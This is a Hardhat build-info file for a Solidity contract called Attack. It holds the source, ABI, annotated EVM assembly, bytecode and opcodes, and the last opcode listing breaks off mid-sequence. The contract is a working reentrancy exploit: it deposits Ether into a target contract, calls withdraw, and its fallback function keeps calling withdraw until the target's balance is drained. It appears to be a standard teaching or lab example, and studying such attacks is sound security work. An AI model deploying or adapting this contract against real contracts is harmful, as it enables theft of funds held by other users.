{
	"id": "5f99552aa4009da7e6b9c2a78d782180",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.4.24",
	"solcLongVersion": "0.4.24+commit.e67f0147",
	"input": {
		"language": "Solidity",
		"sources": {
			"Attack.sol": {
				"content": "pragma solidity ^0.4.24;\r\n\r\ncontract Attack {\r\n    address public vulnerableContract;\r\n\r\n    constructor(address _vulnerableContract) public {\r\n        vulnerableContract = _vulnerableContract;\r\n    }\r\n\r\n    function attack() public payable {\r\n        // First, deposit a small amount of Ether to meet the withdrawal conditions\r\n        bool depositSuccess = vulnerableContract.call.value(msg.value)(\"\");\r\n        require(depositSuccess, \"Deposit failed\");\r\n\r\n        // Call the withdraw function of the vulnerable contract to trigger the reentrancy attack\r\n        bool withdrawSuccess = vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value);\r\n        require(withdrawSuccess, \"Withdraw failed\");\r\n    }\r\n\r\n    // Fallback function, which is called when receiving Ether\r\n    function () public payable {\r\n        // If the vulnerable contract still has Ether, continue to call the withdraw function to attack\r\n        if (address(vulnerableContract).balance >= msg.value) {\r\n            bool withdrawSuccess = vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value);\r\n            require(withdrawSuccess, \"Withdraw failed\");\r\n        }\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"Attack.sol": {
				"Attack": {
					"abi": [
						{
							"constant": true,
							"inputs": [],
							"name": "vulnerableContract",
							"outputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"name": "_vulnerableContract",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"payable": true,
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"Attack.sol\":28:1187  contract Attack {\r... */\n  mstore(0x40, 0x80)\n    /* \"Attack.sol\":93:200  constructor(address _vulnerableContract) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"Attack.sol\":93:200  constructor(address _vulnerableContract) public {\r... */\n  pop\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  dup1\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"Attack.sol\":173:192  _vulnerableContract */\n  dup1\n    /* \"Attack.sol\":152:170  vulnerableContract */\n  0x0\n  dup1\n    /* \"Attack.sol\":152:192  vulnerableContract = _vulnerableContract */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Attack.sol\":93:200  constructor(address _vulnerableContract) public {\r... */\n  pop\n    /* \"Attack.sol\":28:1187  contract Attack {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"Attack.sol\":28:1187  contract Attack {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x144166ae\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n    tag_1:\n        /* \"Attack.sol\":1010:1030  bool withdrawSuccess */\n      0x0\n        /* \"Attack.sol\":984:993  msg.value */\n      callvalue\n        /* \"Attack.sol\":953:971  vulnerableContract */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":945:980  address(vulnerableContract).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"Attack.sol\":945:993  address(vulnerableContract).balance >= msg.value */\n      lt\n      iszero\n        /* \"Attack.sol\":941:1177  if (address(vulnerableContract).balance >= msg.value) {\r... */\n      iszero\n      tag_6\n      jumpi\n        /* \"Attack.sol\":1033:1051  vulnerableContract */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":1033:1056  vulnerableContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":1064:1094  keccak256(\"withdraw(uint256)\") */\n      mload(0x40)\n      dup1\n      dup1\n      0x77697468647261772875696e7432353629000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x11\n      add\n      swap1\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"Attack.sol\":1033:1107  vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value) */\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n        /* \"Attack.sol\":1097:1106  msg.value */\n      callvalue\n        /* \"Attack.sol\":1033:1107  vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n        /* \"Attack.sol\":1010:1107  bool withdrawSuccess = vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value) */\n      swap1\n      pop\n        /* \"Attack.sol\":1130:1145  withdrawSuccess */\n      dup1\n        /* \"Attack.sol\":1122:1165  require(withdrawSuccess, \"Withdraw failed\") */\n      iszero\n      iszero\n      tag_7\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xf\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x5769746864726177206661696c65640000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_7:\n        /* \"Attack.sol\":941:1177  if (address(vulnerableContract).balance >= msg.value) {\r... */\n    tag_6:\n        /* \"Attack.sol\":798:1184  function () public payable {\r... */\n      pop\n        /* \"Attack.sol\":28:1187  contract Attack {\r... */\n      stop\n        /* \"Attack.sol\":51:84  address public vulnerableContract */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_8:\n        /* \"Attack.sol\":51:84  address public vulnerableContract */\n      pop\n      tag_9\n      jump(tag_10)\n    tag_9:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Attack.sol\":208:726  function attack() public payable {\r... */\n    tag_3:\n      tag_11\n      jump(tag_12)\n    tag_11:\n      stop\n        /* \"Attack.sol\":51:84  address public vulnerableContract */\n    tag_10:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Attack.sol\":208:726  function attack() public payable {\r... */\n    tag_12:\n        /* \"Attack.sol\":337:356  bool depositSuccess */\n      0x0\n        /* \"Attack.sol\":567:587  bool withdrawSuccess */\n      dup1\n        /* \"Attack.sol\":359:377  vulnerableContract */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":359:382  vulnerableContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":389:398  msg.value */\n      callvalue\n        /* \"Attack.sol\":359:403  vulnerableContract.call.value(msg.value)(\"\") */\n      mload(0x40)\n      dup1\n      0x20\n      add\n      swap1\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n        /* \"Attack.sol\":337:403  bool depositSuccess = vulnerableContract.call.value(msg.value)(\"\") */\n      swap2\n      pop\n        /* \"Attack.sol\":422:436  depositSuccess */\n      dup2\n        /* \"Attack.sol\":414:455  require(depositSuccess, \"Deposit failed\") */\n      iszero\n      iszero\n      tag_14\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xe\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4465706f736974206661696c6564000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_14:\n        /* \"Attack.sol\":590:608  vulnerableContract */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":590:613  vulnerableContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":621:651  keccak256(\"withdraw(uint256)\") */\n      mload(0x40)\n      dup1\n      dup1\n      0x77697468647261772875696e7432353629000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x11\n      add\n      swap1\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"Attack.sol\":590:664  vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value) */\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n        /* \"Attack.sol\":654:663  msg.value */\n      callvalue\n        /* \"Attack.sol\":590:664  vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n        /* \"Attack.sol\":567:664  bool withdrawSuccess = vulnerableContract.call(bytes4(keccak256(\"withdraw(uint256)\")), msg.value) */\n      swap1\n      pop\n        /* \"Attack.sol\":683:698  withdrawSuccess */\n      dup1\n        /* \"Attack.sol\":675:718  require(withdrawSuccess, \"Withdraw failed\") */\n      iszero\n      iszero\n      tag_15\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xf\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x5769746864726177206661696c65640000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_15:\n        /* \"Attack.sol\":208:726  function attack() public payable {\r... */\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820da64d2f9db30c0519d56a0eeaffc5e5b1efc15cd205ebd04236885c0bc473ddd0029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405160208061053983398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506104b6806100836000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063144166ae146101e35780639e5faafc1461023a575b6000346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311015156101e0576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f77697468647261772875696e7432353629000000000000000000000000000000815250601101905060405180910390207c01000000000000000000000000000000000000000000000000000000009004346040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000875af19250505090508015156101df576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f5769746864726177206661696c6564000000000000000000000000000000000081525060200191505060405180910390fd5b5b50005b3480156101ef57600080fd5b506101f8610244565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610242610269565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163460405180602001905060006040518083038185875af1925050509150811515610336576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f4465706f736974206661696c656400000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f77697468647261772875696e7432353629000000000000000000000000000000815250601101905060405180910390207c01000000000000000000000000000000000000000000000000000000009004346040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000875af1925050509050801515610486576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f5769746864726177206661696c6564000000000000000000000000000000000081525060200191505060405180910390fd5b50505600a165627a7a72305820da64d2f9db30c0519d56a0eeaffc5e5b1efc15cd205ebd04236885c0bc473ddd0029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x539 DUP4 CODECOPY DUP2 ADD DUP1 PUSH1 0x40 MSTORE DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x4B6 DUP1 PUSH2 0x83 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x144166AE EQ PUSH2 0x1E3 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x23A JUMPI JUMPDEST PUSH1 0x0 CALLVALUE PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO ISZERO PUSH2 0x1E0 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x77697468647261772875696E7432353629000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x11 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x1DF JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x5769746864726177206661696C65640000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMPDEST POP STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F8 PUSH2 0x244 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x242 PUSH2 0x269 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP SWAP2 POP DUP2 ISZERO ISZERO PUSH2 0x336 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xE DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4465706F736974206661696C6564000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x77697468647261772875696E7432353629000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x11 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x486 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x5769746864726177206661696C65640000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xda PUSH5 0xD2F9DB30C0 MLOAD SWAP14 JUMP LOG0 0xee 0xaf 0xfc 0x5e JUMPDEST 0x1e 0xfc ISZERO 0xcd KECCAK256 0x5e 0xbd DIV 0x23 PUSH9 0x85C0BC473DDD002900 ",
							"sourceMap": "28:1159:0:-;;;93:107;8:9:-1;5:2;;;30:1;27;20:12;5:2;93:107:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;173:19;152:18;;:40;;;;;;;;;;;;;;;;;;93:107;28:1159;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063144166ae146101e35780639e5faafc1461023a575b6000346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311015156101e0576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f77697468647261772875696e7432353629000000000000000000000000000000815250601101905060405180910390207c01000000000000000000000000000000000000000000000000000000009004346040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000875af19250505090508015156101df576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f5769746864726177206661696c6564000000000000000000000000000000000081525060200191505060405180910390fd5b5b50005b3480156101ef57600080fd5b506101f8610244565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610242610269565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163460405180602001905060006040518083038185875af1925050509150811515610336576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f4465706f736974206661696c656400000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660405180807f77697468647261772875696e7432353629000000000000000000000000000000815250601101905060405180910390207c01000000000000000000000000000000000000000000000000000000009004346040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000875af1925050509050801515610486576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f5769746864726177206661696c6564000000000000000000000000000000000081525060200191505060405180910390fd5b50505600a165627a7a72305820da64d2f9db30c0519d56a0eeaffc5e5b1efc15cd205ebd04236885c0bc473ddd0029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x144166AE EQ PUSH2 0x1E3 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x23A JUMPI JUMPDEST PUSH1 0x0 CALLVALUE PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO ISZERO PUSH2 0x1E0 JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP1 DUP1 PUSH32 0x77697468647261772875696E7432353629000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x11 ADD SWAP1 POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL SWAP3 POP POP POP SWAP1 POP DUP1 ISZERO ISZERO PUSH2 0x1DF JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xF DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x5769746864726177206661696C65640000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMPDEST POP STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F8 PUSH2 0x244 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x242 PUSH2 0x269 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP 